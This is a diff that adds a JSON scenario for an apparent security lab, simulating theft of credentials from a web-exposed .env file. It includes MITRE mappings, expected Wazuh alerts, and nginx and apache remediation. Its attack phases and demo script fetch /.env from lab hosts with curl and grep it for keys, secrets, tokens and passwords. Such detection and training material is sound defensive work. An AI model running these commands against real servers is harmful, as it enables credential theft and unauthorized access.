@@ -1,0 +1,151 @@
+{
+  "id": "S1-02",
+  "name": "Exposed .env File via Web Server",
+  "category": "API Keys & Secrets",
+  "version": "1.0",
+  "description": "Access .env file exposed through misconfigured web server",
+  "difficulty": "Easy",
+  "real_world_relevance": "Laravel .env exposure incidents, countless misconfigured deployments",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Initial Access"],
+    "techniques": [
+      {"id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["vulnerable-app"],
+    "network": "cloud_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker discovers .env file accessible via web server misconfiguration",
+    "diagram": [
+      "1. Attacker performs directory/file enumeration on web server",
+      "2. Attacker discovers .env file is accessible",
+      "3. Attacker downloads .env file with all secrets",
+      "4. Attacker extracts database credentials, API keys",
+      "5. Attacker uses credentials for lateral movement"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Discovery",
+      "description": "Probe for common sensitive files",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.41.0.20:8888/.env",
+          "method": "GET",
+          "expected_status": 200
+        }
+      ]
+    },
+    {
+      "name": "Credential Extraction",
+      "description": "Parse .env file for secrets",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.41.0.20:8888/.env",
+          "method": "GET",
+          "expected_response_contains": [
+            "DATABASE_PASSWORD",
+            "AWS_SECRET_ACCESS_KEY",
+            "GITHUB_TOKEN"
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Credential Validation",
+      "description": "Test extracted credentials",
+      "actions": [
+        {
+          "type": "command",
+          "command": "curl -s http://172.41.0.20:8888/.env | grep AWS",
+          "expected_output_contains": ["AWS_ACCESS_KEY_ID"]
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Web Access",
+      "description": "HTTP request to /.env or similar sensitive files",
+      "wazuh_rule": "100603"
+    },
+    {
+      "type": "Web Access",
+      "description": "Multiple requests probing for config files",
+      "wazuh_rule": "100604"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100603",
+      "level": 12,
+      "description": "NHI: .env file accessed via HTTP - SECRET EXPOSURE"
+    },
+    {
+      "rule_id": "100604",
+      "level": 8,
+      "description": "NHI: Sensitive file enumeration attempt"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Block access to .env files in web server config",
+      "Rotate all credentials found in exposed file",
+      "Review access logs for previous exposures"
+    ],
+    "long_term": [
+      "Configure web server to deny access to dotfiles",
+      "Move .env files outside web root",
+      "Use proper secrets management instead of .env files",
+      "Implement Web Application Firewall (WAF) rules"
+    ],
+    "nginx_config": [
+      "# Block access to dotfiles",
+      "location ~ /\\. {",
+      "    deny all;",
+      "    return 404;",
+      "}"
+    ],
+    "apache_config": [
+      "# Block access to dotfiles",
+      "<FilesMatch \"^\\.\">",
+      "    Require all denied",
+      "</FilesMatch>"
+    ]
+  },
+
+  "demo_script": {
+    "container": "attacker",
+    "commands": [
+      "# Probe for .env file",
+      "curl -s http://vulnerable-app:8888/.env",
+      "",
+      "# Extract specific secrets",
+      "curl -s http://vulnerable-app:8888/.env | grep -E '(KEY|SECRET|TOKEN|PASSWORD)'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Laravel .env Exposure",
+      "url": "https://laravel.com/docs/configuration#environment-configuration"
+    },
+    {
+      "title": "OWASP Security Misconfiguration",
+      "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+    }
+  ]
+}
